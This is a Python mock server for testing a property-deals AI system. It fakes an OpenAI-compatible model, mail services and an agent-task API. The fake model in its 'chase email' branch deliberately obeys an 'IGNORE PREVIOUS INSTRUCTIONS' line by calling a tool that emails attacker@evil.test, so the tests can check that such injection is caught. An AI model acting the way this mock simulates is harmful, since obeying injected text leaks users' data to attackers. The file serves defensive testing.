"""Mock outside world for the Property Deals AI tests (standard library only).

One process, three ports, run as the `pd-mock` container in the sandbox network:
  :8080 HTTP
      /v1/chat/completions        a "local model" (OpenAI-compatible) that behaves like an agent:
                                   calls tools, answers JSON, falls for prompt injection on purpose
      /down/v1/chat/completions   a cloud provider that is down (503) - fallback order tests
      /js/api/v1/...              JobShout: login, agents, tasks/launch, task-runs, approvals, decide
      /gmail/...  /m365/...       Gmail API and Microsoft Graph mail, sharing one mailbox
      /_ctl  /_log  /_smtp  /_mail/inbox   test control and inspection
  :2525 SMTP sink (no auth, no TLS)
  :1143 IMAP (plain; LOGIN, EXAMINE, UID SEARCH, UID FETCH, LOGOUT) on the same mailbox
"""
import base64
import email.utils
import json
import re
import socketserver
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOCK = threading.Lock()
STATE = {
    "log": [],             # every model request (messages, tools)
    "smtp": [],            # every email received
    "mailbox": [],         # inbound mail served by IMAP / Gmail / Graph
    "jobshout_down": False,
    "js_runs": {},         # run_id -> {status, execution_id, output}
    "js_approvals": {},    # approval_id -> {...}
    "js_launches": [],
}
JS_AGENT = "11111111-2222-4333-8444-555555555555"
POSTCODES = {"YO1 7AA": (53.96, -1.08), "YO1 9AB": (53.962, -1.085), "YO10 5DD": (53.947, -1.05),
             "LS1 1AA": (53.797, -1.548), "SW1A 1AA": (51.501, -0.142)}


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


# ---------------------------------------------------------------- the "local model"

def text_of(messages):
    return "\n".join(str(m.get("content") or "") for m in messages if isinstance(m.get("content"), str))


def extract_json_lists(text, key):
    """Find "key":[...] arrays of objects in JSON embedded in the prompt/tool results."""
    out = []
    for m in re.finditer(r'"%s"\s*:\s*\[' % re.escape(key), text):
        depth, i = 0, m.end() - 1
        for j in range(i, len(text)):
            if text[j] == "[":
                depth += 1
            elif text[j] == "]":
                depth -= 1
                if depth == 0:
                    try:
                        out.extend(json.loads(text[i:j + 1]))
                    except ValueError:
                        pass
                    break
    return out


def enquiries_from(messages):
    found = {}
    for m in messages:
        c = m.get("content")
        if not isinstance(c, str):
            continue
        if m.get("role") == "tool" and m.get("tool_call_id", "").startswith("call_enq"):
            try:
                for e in json.loads(c):
                    found[e["uuid"]] = e
            except (ValueError, TypeError, KeyError):
                pass
        for e in extract_json_lists(c, "open_enquiries"):
            if isinstance(e, dict) and "uuid" in e:
                found[e["uuid"]] = e
    return list(found.values())


def model_reply(body):
    messages, tools = body.get("messages", []), body.get("tools") or []
    system = str(messages[0].get("content") if messages else "")
    allt = text_of(messages)
    tool_names = {t["function"]["name"] for t in tools}
    tool_msgs = [m for m in messages if m.get("role") == "tool"]
    usage = {"prompt_tokens": 1000, "completion_tokens": 200}

    def say(obj):
        return {"choices": [{"message": {"role": "assistant", "content": json.dumps(obj)}}], "usage": usage}

    def call(name, cid, args=None):
        return {"choices": [{"message": {"role": "assistant", "content": "", "tool_calls": [
            {"id": cid, "type": "function", "function": {"name": name, "arguments": json.dumps(args or {})}}]}}],
            "usage": usage}

    if "Reply with the single word: ok" in allt:
        return {"choices": [{"message": {"role": "assistant", "content": "ok"}}], "usage": usage}

    if "chase email" in system:  # legal chaser
        # Prompt injection bait: an email told the model to call a tool it doesn't have.
        if "IGNORE PREVIOUS INSTRUCTIONS" in allt and not any(m.get("tool_call_id") == "call_evil" for m in tool_msgs):
            return call("send_email_now", "call_evil", {"to": "attacker@evil.test"})
        if "list_open_enquiries" in tool_names and not any(m.get("tool_call_id", "").startswith("call_enq") for m in tool_msgs):
            return call("list_open_enquiries", "call_enq1")
        if "list_recent_emails" in tool_names and not any(m.get("tool_call_id") == "call_mail" for m in tool_msgs):
            return call("list_recent_emails", "call_mail")
        enqs = enquiries_from(messages)
        lines = ["%d) %s" % (i + 1, e["title"]) for i, e in enumerate(enqs)]
        note = ""
        m = re.search(r"rejected your last draft with this note \(follow it\): (.*)", allt)
        if m:
            note = "Per your note: " + m.group(1).strip() + "\n"
        updates = []
        for e in enqs:
            if (e["title"] + " answered") in allt:
                updates.append({"enquiry_uuid": e["uuid"], "action": "resolved", "note": "Answered in the latest email"})
        open_left = [e for e in enqs if e["uuid"] not in {u["enquiry_uuid"] for u in updates}]
        body_text = (note + "Dear colleagues,\nPlease could you reply on these open enquiries:\n" +
                     "\n".join("%d) %s" % (i + 1, e["title"]) for i, e in enumerate(open_left)) + "\nThe team")
        return say({"summary": "%d open enquiries" % len(enqs), "blockers": [e["title"] for e in open_left],
                    "email": {"to_party": "seller_solicitor", "subject": "Open enquiries", "body": body_text}
                    if open_left else None,
                    "enquiry_updates": updates, "new_enquiries": []})

    if "booking request" in system:  # booking agent
        sups = extract_json_lists(allt, "suppliers")
        if not sups and "find_suppliers" in tool_names and not tool_msgs:
            return call("find_suppliers", "call_sup", {"service": "epc_assessor"})
        for m in tool_msgs:
            try:
                sups = sups or json.loads(m["content"])
            except (ValueError, TypeError):
                pass
        return say({"service": "epc_assessor", "note": "nearest first",
                    "requests": [{"supplier_uuid": s["supplier_uuid"], "subject": "EPC booking request",
                                  "body": "Hello %s, could you do an EPC this week? Earliest slots please." % s.get("name")}
                                 for s in sups[:3] if isinstance(s, dict) and s.get("supplier_uuid")]})

    if "digest" in system.lower():
        return say({"summary": "Digest prose: your most urgent work is listed first."})

    return say({"summary": "nothing to do"})


# ---------------------------------------------------------------- mailbox helpers

def mailbox_entry(m):
    return {"id": m["id"], "uid": m["uid"], "from": m["from"], "to": m.get("to", "deals@ai-buyers.test"),
            "subject": m["subject"], "body": m["body"], "date": m["date"], "ts": m["ts"]}


class Http(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def send(self, code, obj=None, raw=None):
        data = raw if raw is not None else json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def body(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n) if n else b""
        try:
            return json.loads(raw or b"{}")
        except ValueError:
            return {"_raw": raw.decode(errors="replace")}

    def do_GET(self):
        p = self.path
        with LOCK:
            if p == "/_log":
                return self.send(200, STATE["log"])
            if p == "/_smtp":
                return self.send(200, STATE["smtp"])
            if p == "/_js":
                return self.send(200, {"launches": STATE["js_launches"], "approvals": STATE["js_approvals"],
                                       "runs": STATE["js_runs"]})
            if p.startswith("/js/api/v1/"):
                return self.jobshout("GET", p[len("/js/api/v1"):], {})
            if p.startswith("/gmail/gmail/v1/users/me/messages"):
                return self.gmail(p)
            if p.startswith("/m365/v1.0/users/"):
                return self.m365(p)
            if p.startswith("/epc/") or p.startswith("/lr/") or p.startswith("/ch/") or p.startswith("/pc/"):
                return self.data_api("GET", p, {})
        self.send(404, {"error": "not found"})

    def do_POST(self):
        p, b = self.path, self.body()
        with LOCK:
            if p == "/v1/chat/completions":
                STATE["log"].append({"messages": b.get("messages"), "tools": [t["function"]["name"] for t in b.get("tools") or []],
                                     "model": b.get("model")})
                return self.send(200, model_reply(b))
            if p == "/down/v1/chat/completions":
                return self.send(503, {"error": {"message": "overloaded"}})
            if p == "/_ctl":
                STATE.update({k: v for k, v in b.items() if k in ("jobshout_down",)})
                if b.get("reset_log"):
                    STATE["log"] = []
                if b.get("reset_all"):
                    STATE.update(log=[], smtp=[], mailbox=[], jobshout_down=False, js_runs={}, js_approvals={},
                                 js_launches=[])
                if b.get("decide_external"):
                    a = STATE["js_approvals"][b["decide_external"]]
                    a.update(status=b.get("status", "approved"), decided_by=str(uuid.uuid4()), decided_at=now_iso(),
                             reason=b.get("reason"))
                return self.send(200, {"ok": True})
            if p == "/_mail/inbox":
                n = len(STATE["mailbox"]) + 1
                ts = time.time()
                STATE["mailbox"].append({"id": "m%d" % n, "uid": 100 + n, "from": b["from"], "subject": b["subject"],
                                         "body": b["body"], "ts": ts, "date": email.utils.formatdate(ts)})
                return self.send(201, {"ok": True})
            if p.startswith("/js/api/v1/"):
                return self.jobshout("POST", p[len("/js/api/v1"):], b)
            if p.startswith("/pc/"):
                return self.data_api("POST", p, b)
            if p in ("/gmail/token", "/m365/token"):
                raw = b.get("_raw", "")
                if "secret-ok" not in raw:
                    return self.send(401, {"error": "invalid_client", "error_description": "bad secret"})
                return self.send(200, {"access_token": "tok-" + p.split("/")[1], "expires_in": 3600})
        self.send(404, {"error": "not found"})

    # Open data: EPC register, Land Registry Price Paid, Companies House, postcodes.io ----
    def data_api(self, method, p, b):
        if p.startswith("/pc/postcodes") and method == "POST":
            res = []
            for q in b.get("postcodes", []):
                g = POSTCODES.get(q.upper().replace("  ", " "))
                res.append({"query": q, "result": {"postcode": q, "latitude": g[0], "longitude": g[1],
                                                   "admin_district": "York"} if g else None})
            return self.send(200, {"status": 200, "result": res})
        if p.startswith("/pc/postcodes?"):
            return self.send(200, {"status": 200, "result": [{"postcode": "YO1 7AA", "latitude": 53.96, "longitude": -1.08}]})
        if p.startswith("/epc/api/v1/domestic/search"):
            auth = self.headers.get("Authorization", "")
            if auth != "Basic " + base64.b64encode(b"epc@data-buyers.test:epc-key").decode():
                return self.send(401, {"error": "unauthorised"})
            if "YO1" not in p:
                return self.send(200, {"column-names": [], "rows": []})
            return self.send(200, {"rows": [
                {"lmk-key": "lmk-1", "address": "7 Mill Lane, York", "postcode": "YO1 7AA", "current-energy-rating": "C",
                 "lodgement-date": "2022-03-01", "certificate-number": "1234-5678-9012-3456-7890", "total-floor-area": "84",
                 "property-type": "House"},
                {"lmk-key": "lmk-old", "address": "7 Mill Lane, York", "postcode": "YO1 7AA", "current-energy-rating": "E",
                 "lodgement-date": "2010-01-01", "certificate-number": "0000-0000", "property-type": "House"},
                {"lmk-key": "lmk-2", "address": "9 Mill Lane, York", "postcode": "YO1 7AA", "current-energy-rating": "D",
                 "lodgement-date": "2019-06-01", "property-type": "House"}]})
        if p.startswith("/lr/data/ppi/transaction-record.json"):
            if "YO1" not in p:
                return self.send(200, {"result": {"items": []}})
            items = [{"transactionId": "{T-%d}" % i, "pricePaid": price, "transactionDate": date,
                      "propertyAddress": {"paon": str(n), "street": "MILL LANE", "town": "YORK", "postcode": "YO1 7AA"},
                      "propertyType": {"prefLabel": [{"_value": "terraced"}]}, "estateType": {"prefLabel": [{"_value": "freehold"}]}}
                     for i, (price, date, n) in enumerate([(140000, "Fri, 10 May 2024", 3), (160000, "2025-01-15", 5),
                                                           (150000, "2025-06-30", 11)])]
            return self.send(200, {"result": {"items": items}})
        if p.startswith("/ch/"):
            if self.headers.get("Authorization") != "Basic " + base64.b64encode(b"ch-key:").decode():
                return self.send(401, {"error": "Invalid Authorization"})
            if p.startswith("/ch/search/companies"):
                return self.send(200, {"items": [{"company_number": "01234567", "title": "ACME HOMES LTD", "company_status": "active",
                                                  "date_of_creation": "2019-02-01", "address_snippet": "1 High St, York"}]})
            m = re.match(r"^/ch/company/(\w+)(/officers)?", p)
            if m and m.group(1) != "01234567":
                return self.send(404, {"errors": [{"error": "company-profile-not-found"}]})
            if m and m.group(2):
                return self.send(200, {"items": [{"name": "SMITH, Jo", "officer_role": "director", "appointed_on": "2019-02-01"},
                                                 {"name": "OLD, Al", "officer_role": "director", "resigned_on": "2020-01-01"}]})
            if m:
                return self.send(200, {"company_name": "ACME HOMES LTD", "company_status": "active", "type": "ltd",
                                       "date_of_creation": "2019-02-01", "sic_codes": ["68100"],
                                       "accounts": {"overdue": True}, "confirmation_statement": {"overdue": False},
                                       "registered_office_address": {"locality": "York"}})
        return self.send(404, {"error": "no route " + p})

    # JobShout ---------------------------------------------------------------
    def jobshout(self, method, path, b):
        if path == "/auth/login":
            if b.get("password") != "js-pass":
                return self.send(401, {"error": "invalid credentials"})
            return self.send(200, {"access_token": "js-token", "refresh_token": "r"})
        if self.headers.get("Authorization") != "Bearer js-token":
            return self.send(401, {"error": "unauthorized"})
        if path == "/agents":
            return self.send(200, [{"id": JS_AGENT, "name": "Legal chaser (JobShout)", "description": "chases"}])
        if path == "/tasks/launch" and method == "POST":
            if STATE["jobshout_down"]:
                return self.send(503, {"error": "maintenance"})
            run_id, exec_id, appr = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
            STATE["js_launches"].append(b)
            STATE["js_runs"][run_id] = {"id": run_id, "task_id": str(uuid.uuid4()), "agent_id": b.get("agent_id"),
                                        "status": "running", "execution_id": exec_id, "output": None,
                                        "total_tokens": 900, "cost_usd": 0.012, "latency_ms": 1500}
            STATE["js_approvals"][appr] = {"id": appr, "execution_id": exec_id, "agent_id": b.get("agent_id"),
                                           "tool_name": "send_email", "status": "pending", "requested_at": now_iso(),
                                           "tool_input": {"to": "sol@seller-sol.test", "subject": "Chase from JobShout",
                                                          "body": "Please reply to the open enquiries."}}
            return self.send(202, {"kind": "run", "run_id": run_id, "task": {"id": STATE["js_runs"][run_id]["task_id"]}})
        m = re.match(r"^/task-runs/([0-9a-f-]+)$", path)
        if m:
            r = STATE["js_runs"].get(m.group(1))
            if not r:
                return self.send(404, {"error": "no run"})
            decided = [a for a in STATE["js_approvals"].values()
                       if a["execution_id"] == r["execution_id"] and a["status"] != "pending"]
            if decided:
                r["status"] = "completed" if decided[0]["status"] == "approved" else "failed"
                r["output"] = "Email sent" if r["status"] == "completed" else None
                r["error_message"] = None if r["status"] == "completed" else "rejected"
            return self.send(200, r)
        if path.startswith("/approvals") and method == "GET":
            status = re.search(r"status=(\w+)", path)
            items = [a for a in STATE["js_approvals"].values() if not status or a["status"] == status.group(1)]
            return self.send(200, items)
        m = re.match(r"^/approvals/([0-9a-f-]+)/decide$", path)
        if m and method == "POST":
            a = STATE["js_approvals"].get(m.group(1))
            if not a:
                return self.send(404, {"error": "no approval"})
            a.update(status="approved" if b.get("decision") == "approve" else "rejected", reason=b.get("reason"),
                     decided_at=now_iso())
            return self.send(200, a)
        return self.send(404, {"error": "no route " + path})

    # Gmail ------------------------------------------------------------------
    def gmail(self, p):
        if self.headers.get("Authorization") != "Bearer tok-gmail":
            return self.send(401, {"error": {"message": "unauthorized"}})
        m = re.match(r"^/gmail/gmail/v1/users/me/messages/([\w]+)", p)
        if m:
            for x in STATE["mailbox"]:
                if x["id"] == m.group(1):
                    return self.send(200, {"id": x["id"], "internalDate": str(int(x["ts"] * 1000)), "snippet": x["body"][:40],
                                           "payload": {"mimeType": "multipart/alternative", "headers": [
                                               {"name": "From", "value": x["from"]}, {"name": "To", "value": "deals@ai-buyers.test"},
                                               {"name": "Subject", "value": x["subject"]}],
                                               "parts": [{"mimeType": "text/plain", "body": {
                                                   "data": base64.urlsafe_b64encode(x["body"].encode()).decode().rstrip("=")}}]}})
            return self.send(404, {"error": {"message": "not found"}})
        after = re.search(r"after%3A(\d+)|after:(\d+)", p)
        after = int(after.group(1) or after.group(2)) if after else 0
        return self.send(200, {"messages": [{"id": x["id"]} for x in STATE["mailbox"] if x["ts"] > after]})

    # Microsoft Graph ----------------------------------------------------------
    def m365(self, p):
        if self.headers.get("Authorization") != "Bearer tok-m365":
            return self.send(401, {"error": {"message": "unauthorized"}})
        return self.send(200, {"value": [{
            "id": x["id"], "internetMessageId": "<%s@mock>" % x["id"], "subject": x["subject"],
            "from": {"emailAddress": {"address": email.utils.parseaddr(x["from"])[1], "name": "Seller Solicitor"}},
            "toRecipients": [{"emailAddress": {"address": "deals@ai-buyers.test"}}],
            "receivedDateTime": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(x["ts"])),
            "body": {"contentType": "text", "content": x["body"]}} for x in STATE["mailbox"]]})


# ---------------------------------------------------------------- SMTP sink

class Smtp(socketserver.StreamRequestHandler):
    def w(self, line):
        self.wfile.write((line + "\r\n").encode())

    def handle(self):
        self.w("220 pd-mock ESMTP")
        msg = {"from": None, "to": [], "data": ""}
        while True:
            line = self.rfile.readline()
            if not line:
                return
            cmd = line.decode(errors="replace").strip()
            up = cmd.upper()
            if up.startswith("EHLO") or up.startswith("HELO"):
                self.wfile.write(b"250-pd-mock\r\n250 SIZE 10000000\r\n")
            elif up.startswith("MAIL FROM"):
                msg["from"] = cmd[10:].strip()
                self.w("250 OK")
            elif up.startswith("RCPT TO"):
                msg["to"].append(cmd[8:].strip())
                self.w("250 OK")
            elif up == "DATA":
                self.w("354 go ahead")
                data = []
                while True:
                    l = self.rfile.readline().decode(errors="replace")
                    if l in (".\r\n", ".\n", ""):
                        break
                    data.append(l)
                msg["data"] = "".join(data)
                with LOCK:
                    STATE["smtp"].append(dict(msg))
                msg = {"from": None, "to": [], "data": ""}
                self.w("250 queued")
            elif up == "QUIT":
                self.w("221 bye")
                return
            elif up.startswith("RSET") or up.startswith("NOOP"):
                self.w("250 OK")
            else:
                self.w("502 not implemented")


# ---------------------------------------------------------------- IMAP

class Imap(socketserver.StreamRequestHandler):
    def w(self, s):
        self.wfile.write(s if isinstance(s, bytes) else (s + "\r\n").encode())

    def handle(self):
        self.w("* OK pd-mock IMAP ready")
        while True:
            line = self.rfile.readline()
            if not line:
                return
            parts = line.decode(errors="replace").strip().split(" ", 2)
            tag, cmd = parts[0], (parts[1].upper() if len(parts) > 1 else "")
            rest = parts[2] if len(parts) > 2 else ""
            if cmd == "LOGIN":
                if '"imap-pass"' not in rest:
                    self.w(tag + " NO [AUTHENTICATIONFAILED] invalid")
                else:
                    self.w(tag + " OK LOGIN completed")
            elif cmd in ("EXAMINE", "SELECT"):
                self.w("* %d EXISTS" % len(STATE["mailbox"]))
                self.w(tag + " OK [READ-ONLY] done")
            elif cmd == "UID" and rest.upper().startswith("SEARCH"):
                m = re.search(r"UID (\d+):\*", rest)
                lo = int(m.group(1)) if m else 0
                with LOCK:
                    uids = [str(x["uid"]) for x in STATE["mailbox"] if x["uid"] >= lo]
                    if m and not uids and STATE["mailbox"]:
                        uids = [str(STATE["mailbox"][-1]["uid"])]  # RFC 3501: n:* always returns the last message
                self.w("* SEARCH " + " ".join(uids))
                self.w(tag + " OK SEARCH completed")
            elif cmd == "UID" and rest.upper().startswith("FETCH"):
                uid = int(rest.split()[1])
                x = next((x for x in STATE["mailbox"] if x["uid"] == uid), None)
                if x:
                    hdr = ("From: %s\r\nTo: deals@ai-buyers.test\r\nSubject: %s\r\nDate: %s\r\nMessage-ID: <%s@imap.mock>\r\n"
                           "Content-Type: text/plain; charset=utf-8\r\n\r\n" % (x["from"], x["subject"], x["date"], x["id"])).encode()
                    txt = x["body"].encode()
                    self.w(b"* 1 FETCH (UID %d BODY[HEADER.FIELDS (FROM TO SUBJECT DATE MESSAGE-ID)] {%d}\r\n" % (uid, len(hdr)))
                    self.w(hdr)
                    self.w(b" BODY[TEXT]<0> {%d}\r\n" % len(txt))
                    self.w(txt)
                    self.w(b")\r\n")
                self.w(tag + " OK FETCH completed")
            elif cmd == "LOGOUT":
                self.w("* BYE")
                self.w(tag + " OK LOGOUT completed")
                return
            else:
                self.w(tag + " BAD unknown")


class TCP(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    threading.Thread(target=TCP(("0.0.0.0", 2525), Smtp).serve_forever, daemon=True).start()
    threading.Thread(target=TCP(("0.0.0.0", 1143), Imap).serve_forever, daemon=True).start()
    ThreadingHTTPServer(("0.0.0.0", 8080), Http).serve_forever()
